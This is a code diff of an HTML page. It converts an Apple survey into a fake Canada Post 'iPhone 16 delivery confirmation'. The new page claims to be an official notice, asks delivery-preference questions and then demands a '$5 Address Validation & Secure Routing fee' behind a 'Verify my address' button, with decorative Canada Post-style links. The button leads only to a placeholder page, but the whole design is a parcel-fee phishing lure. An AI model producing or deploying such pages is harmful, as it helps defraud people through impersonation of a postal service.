@@ -3,10 +3,10 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Apple Preferences — Quick Questions</title>
+<title>Your iPhone 16 — Delivery Confirmation</title>
 <style>
   :root{
-    --brand:#1f4dd8;
+    --brand:#d80618;
     --ink:#0d1b2a;
     --muted:#6b7280;
     --bg:#f6f7f9;
@@ -24,15 +24,32 @@
     background:var(--bg);
     line-height:1.4;
   }
-  /* removed: header topbar image */
+  header.top img.topbar-img{width:100%;height:auto;display:block;}
   .hero{position:relative;height:240px;overflow:hidden;background:#111;}
   .hero img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;}
-  .promo{background:var(--brand);color:#fff;padding:20px 20px 36px;text-align:center;}
+  .promo{
+    background:var(--brand);color:#fff;
+    padding:20px 20px 36px;
+    text-align:center;
+  }
   .promo .container{max-width:900px;margin:0 auto;}
-  .promo h2{margin:0;font-weight:700;font-size:clamp(1rem,0.9rem+1vw,1.5rem);line-height:1.3;}
+  .promo h2{
+    margin:0;
+    font-weight:700;
+    font-size:clamp(1rem,0.9rem+1vw,1.5rem);
+    line-height:1.3;
+  }
   .container{max-width:1100px;margin:0 auto;padding:0 20px;}
-  .notice{background:var(--card);border-radius:var(--radius);box-shadow:0 8px 20px rgba(0,0,0,.06);margin-top:-30px;padding:18px 20px;display:flex;gap:14px;align-items:flex-start;border-left:6px solid var(--brand);}
-  .notice .seal{width:40px;height:40px;border-radius:50%;background:#eef2ff;color:var(--brand);display:grid;place-items:center;font-size:20px;}
+  .notice{
+    background:var(--card);
+    border-radius:var(--radius);
+    box-shadow:0 8px 20px rgba(0,0,0,.06);
+    margin-top:-30px; /* pulled up closer */
+    padding:18px 20px;
+    display:flex;gap:14px;align-items:flex-start;
+    border-left:6px solid var(--brand);
+  }
+  .notice .seal{width:40px;height:40px;border-radius:50%;background:#fff0f0;color:var(--brand);display:grid;place-items:center;font-size:20px;}
   .notice h1{margin:2px 0 4px;font-size:1.25rem;}
   .notice p{margin:0;color:var(--muted);}
   .card{background:var(--card);border-radius:var(--radius);box-shadow:0 8px 24px rgba(0,0,0,.08);overflow:hidden;margin-top:12px;}
@@ -47,78 +64,78 @@
   .btn.selected,.btn:focus-visible{outline:none;border-color:var(--accent);box-shadow:0 0 0 4px rgba(31,77,216,.12);}
   .progress{display:none;padding:24px 20px 28px;}
   .bar{position:relative;height:10px;background:#eef1f4;border-radius:999px;overflow:hidden;}
-  .bar>span{display:block;height:100%;width:0%;background:var(--brand);transition:width 3s linear;}
+  .bar>span{
+    display:block;
+    height:100%;
+    width:0%;              /* start empty */
+    background:var(--brand);
+    transition:width 3s linear; /* animate width */
+  }
   .progress p{margin:12px 4px 0;color:var(--muted);font-weight:600;}
   .result{display:none;padding:26px 20px 30px;}
   .badge{display:inline-block;background:#ecfdf5;color:#047857;border:1px solid #a7f3d0;font-weight:700;padding:6px 10px;border-radius:999px;font-size:.8rem;margin-bottom:10px;}
   .result h3{margin:6px 0 10px;font-size:1.3rem;}
+  .fee{background:#fff7ed;border:1px solid #fed7aa;color:#9a3412;padding:14px;border-radius:12px;margin:12px 0 18px;}
   .primary{display:inline-block;background:var(--accent);color:#fff;text-decoration:none;font-weight:700;padding:12px 18px;border-radius:12px;}
-  .primary:hover{filter:brightness(1.05);}  
+  .primary:hover{filter:brightness(1.05);}
+  .overlay-wrap{position:relative;z-index:2;margin-top:28px;}
+  .links-card{max-width:1100px;margin:0 auto;background:#fff;border-radius:14px;box-shadow:var(--shadow);overflow:hidden;border:1px solid var(--hair);}
+  .link-row{display:flex;align-items:center;gap:14px;padding:18px;text-decoration:none;color:inherit;background:#fff;}
+  .link-row:not(:last-child){border-bottom:1px solid var(--hair);}
+  .link-row:hover{background:#fafafa;}
+  .link-ico{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;background:#f1f5f9;flex:0 0 auto;font-size:20px;}
+  .link-text{font-weight:700;}
+  .chev{margin-left:auto;opacity:.6;}
 </style>
 </head>
 <body>
-<!-- removed top bar image -->
-<section class="hero"><img src="iphone-16-design.jpg" alt="Abstract iPhone image" /></section>
-<section class="promo"><div class="container"><h2>Tell us about your Apple experience.</h2></div></section>
+<header class="top"><img class="topbar-img" src="topbar.png" alt="Header bar" /></header>
+<section class="hero"><img src="iphone-16-design.jpg" alt="" /></section>
+<section class="promo"><div class="container"><h2>Make tracking your packages easier.</h2></div></section>
 
 <div class="container">
   <section class="notice">
-    <div class="seal">🍎</div>
+    <div class="seal">✉️</div>
     <div>
-      <h1>Quick survey: your thoughts on Apple</h1>
-      <p>Answer a few short questions about Apple products you use and what you enjoy most.</p>
+      <h1>Official notice: Your iPhone 16 is ready for delivery</h1>
+      <p>Canada Post has received your parcel from the sender. Confirm your preferred delivery options below to ensure correct delivery.</p>
     </div>
   </section>
 
   <div class="card" id="wizard">
     <section class="step active" data-step="1">
-      <div class="q"><h2>Do you currently own any Apple products?</h2><p>Select one.</p></div>
-      <div class="choices">
-        <button class="btn" data-answer="own-yes">Yes</button>
-        <button class="btn" data-answer="own-no">No, but I’m interested</button>
-        <button class="btn" data-answer="own-none">No</button>
-      </div>
+      <div class="q"><h2>Where should we deliver your package?</h2><p>Choose the most convenient delivery location for your iPhone.</p></div>
+      <div class="choices"><button class="btn" data-answer="home">Home address on file</button><button class="btn" data-answer="post-office">Hold for pickup at a post office</button></div>
     </section>
-
     <section class="step" data-step="2">
-      <div class="q"><h2>Which Apple products do you use or plan to use?</h2><p>Pick all that apply.</p></div>
-      <div class="choices">
-        <button class="btn" data-answer="iphone">iPhone</button>
-        <button class="btn" data-answer="mac">Mac</button>
-        <button class="btn" data-answer="ipad">iPad</button>
-        <button class="btn" data-answer="watch">Apple Watch</button>
-        <button class="btn" data-answer="airpods">AirPods</button>
-        <button class="btn" data-answer="tv">Apple TV</button>
-        <button class="btn" data-answer="other">Other</button>
-      </div>
+      <div class="q"><h2>What time works best?</h2><p>We’ll route to a carrier with your preferred window.</p></div>
+      <div class="choices"><button class="btn" data-answer="day">Daytime (9am–5pm)</button><button class="btn" data-answer="eve">Evening (5pm–9pm)</button></div>
     </section>
-
     <section class="step" data-step="3">
-      <div class="q"><h2>What do you like most about Apple products?</h2><p>Choose the top reason.</p></div>
-      <div class="choices">
-        <button class="btn" data-answer="design">Design & build quality</button>
-        <button class="btn" data-answer="performance">Performance</button>
-        <button class="btn" data-answer="ecosystem">Ecosystem & continuity</button>
-        <button class="btn" data-answer="privacy">Privacy & security</button>
-        <button class="btn" data-answer="camera">Camera & media</button>
-        <button class="btn" data-answer="support">Support & reliability</button>
-      </div>
+      <div class="q"><h2>How should we hand off the package?</h2><p>Tell us whether we should leave it in a safe place or hand it to someone.</p></div>
+      <div class="choices"><button class="btn" data-answer="signature">Require signature on delivery</button><button class="btn" data-answer="safe-drop">Safe Drop (leave in a secure location)</button></div>
     </section>
-
     <section class="progress" id="progress">
       <div class="bar"><span id="barFill"></span></div>
-      <p id="progressText">Saving your answers…</p>
+      <p id="progressText">Processing answers…</p>
     </section>
-
     <section class="result" id="result">
-      <span class="badge">Thanks!</span>
-      <h3>You're all set. Want to take a closer look at the latest iPhone?</h3>
-      <a class="primary" href="https://www.amazon.com/Apple-iPhone-128GB-eSIM-Black/dp/B0F4RM7Y2L/ref=sr_1_1?crid=FAXBK5X4R8Q3&dib=eyJ2IjoiMSJ9.QpfaTs0lNbfPgw6DYmtSBlo3WdqRDBRZ0atH8WfWL0Y26h6nWJKfpmhJpvXrfJ5p4WNHO0-M1GrploCUxlI2pNY1bITV4GhosCHplqkFa_Nk7CUDnVALaCdRYNekbKA6Z_t2kHmkMyjDQm6sPzMKiOEac_KYv3KIDZ-_RJov4HP3EmfX6u99wF5w6JMS9Je84oa5CoRQx8VOhHBO6CVJkEYNb97CN5FMLgtJdO9niHY.qOhXBpVXp_wiinXzdBfZ4g4vNI4yyA_uVDgNl3IJ3OI&dib_tag=se&keywords=iphone%2B16&qid=1759144069&sprefix=iphone%2B16%2Caps%2C626&sr=8-1&th=1" target="_blank" rel="noopener">Check iPhone 16 on Amazon</a>
+      <span class="badge">Ready for delivery</span>
+      <h3>Your package is scheduled. One last step:</h3>
+      <div class="fee">A <strong>$5 Address Validation & Secure Routing fee</strong> is required.</div>
+      <a class="primary" href="blank.html">Verify my address</a>
     </section>
   </div>
 </div>
 
-<!-- removed postal/other delivery links card -->
+<div class="overlay-wrap">
+  <div class="links-card">
+    <a class="link-row" href="#"><div class="link-ico">🔍</div><div class="link-text">Track your delivery</div><div class="chev">›</div></a>
+    <a class="link-row" href="#"><div class="link-ico">🏷️</div><div class="link-text">Find a postal code</div><div class="chev">›</div></a>
+    <a class="link-row" href="#"><div class="link-ico">💵</div><div class="link-text">Find a rate</div><div class="chev">›</div></a>
+    <a class="link-row" href="#"><div class="link-ico">📍</div><div class="link-text">Find a post office</div><div class="chev">›</div></a>
+  </div>
+</div>
 
 <script>
 (function(){
@@ -130,18 +147,9 @@
   steps.forEach((step,idx)=>{
     step.querySelectorAll('.btn').forEach(btn=>{
       btn.addEventListener('click',()=>{
-        // allow multi-select in step 2
-        if(step.dataset.step!=="2"){
-          step.querySelectorAll('.btn').forEach(b=>b.classList.remove('selected'));
-        }
-        btn.classList.toggle('selected');
+        step.querySelectorAll('.btn').forEach(b=>b.classList.remove('selected'));
+        btn.classList.add('selected');
         setTimeout(()=>{
-          if(step.dataset.step==="2"){
-            // advance only if at least one is selected
-            const anySelected=[...step.querySelectorAll('.btn')].some(b=>b.classList.contains('selected'));
-            if(!anySelected) return;
-          }
-          // move to next step
           step.classList.remove('active');
           const next=steps[idx+1];
           if(next){next.classList.add('active');}
@@ -157,7 +165,8 @@
     // Reset to 0 and force a reflow before starting the transition
     barFill.style.transition='none';
     barFill.style.width='0%';
-    void barFill.offsetWidth; // reflow
+    // Force reflow so the browser acknowledges width:0 before we animate
+    void barFill.offsetWidth;
 
     // Re-enable transition and start the fill
     barFill.style.transition='width 3s linear';
@@ -167,7 +176,7 @@
     let t=0;
     const timer=setInterval(()=>{
       t=(t+1)%4;
-      txt.textContent='Saving your answers'+'.'.repeat(t);
+      txt.textContent='Processing answers'+'.'.repeat(t);
     },400);
 
     setTimeout(()=>{
